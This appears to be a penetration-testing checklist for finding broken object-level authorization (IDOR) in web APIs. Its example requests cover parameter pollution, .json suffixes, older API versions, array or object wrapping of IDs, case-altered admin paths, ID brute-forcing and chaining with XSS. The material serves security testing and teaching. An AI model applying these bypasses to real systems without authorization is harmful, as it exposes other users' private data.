**Every time you see a new API endpoint that receives an object ID from the client, ask yourself the following questions:**

- Does the ID belong to a private resource? (e.g /api/user/123/news vs  /api/user/123/transaction)
- What are the IDs that belong to me?
- What are the different possible roles in the API?(For example — user, driver, supervisor, manager)

**Bypassing Object Level Authorization:**

- [ ] Add parameters onto the endpoints for example, if there was

```html
GET /api_v1/messages --> 401
vs 
GET /api_v1/messages?user_id=victim_uuid --> 200
```

**Why Does this Work?**: Sometimes the applications authorization settings are not set to directory level, or the whole URL, making it so that adding URL parameters can bypass previous restrictions to certain endpoints. 

**Note**: To find URL parameters for endpoints, use tools like [Arjun](https://github.com/s0md3v/Arjun) to bruteforce common IDOR URL parameter names.



- [ ] Test for HTTP Parameter pollution

```html
GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK

GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]

/api/v1/users/profile?id=[myId,victimId]
```

- [ ] Add .json to the endpoint, if it is built in Ruby!

```html
/user_data/2341 --> 401 Unauthorized
/user_data/2341.json --> 200 OK
```

- Test on outdated API Versions

```html
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
```

Wrap the ID with an array.

```html
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
```

Wrap the ID with a JSON object:

```html
{“id”:111} --> 401 Unauthriozied

{“id”:{“id”:111}} --> 200 OK
```

JSON Parameter Pollution:

```html
POST /api/get_profile
Content-Type: application/json
{“user_id”:<legit_id>,”user_id”:<victim’s_id>}
```

MFLAC:

```html
GET /admin/profile --> 401 Unauthorized

GET /ADMIN/profile --> 200 OK
```

- [ ] Try to send a wildcard(*) instead of an ID. It’s rare, but sometimes it works.
- [ ] Check through the same corresponding mobile API endpoints for the webapp, to find uuids, if you need them to complete the IDOR exploitation
- [ ] Many times there will be endpoints to translate emails into GUID's, check for those
- [ ] If it is a number id, be sure to test through a large amount of numbers, instead of just guessing Ex: Burp intruder from ID 100-1000
- [ ] If endpoint has a name like /api/users/myinfo, check for /api/admins/myinfo
 
- [ ] Test other HTTP methods, GET, POST, PATCH, PUT, DELETE etc.
- [ ] Test for 'Mass assignments'. Find a GET-request that returns all endpoints and try to add these to other requests.
- [ ] Test older versions of the API, for example `/api/v3/login` -> `/api/v2/login`.
- [ ] Test the endpoint unauthenticated


**Escalating/Chaining with IDOR's Ideas:**

1.  Lets say you find a low impact IDOR, like changing someone elses name, chain that with XSS and you have stored XSS!
2. If you find IDOR on and endpoint, but it requires UUID, chain with info disclosure endpoints that leak UUID, and bypass this!
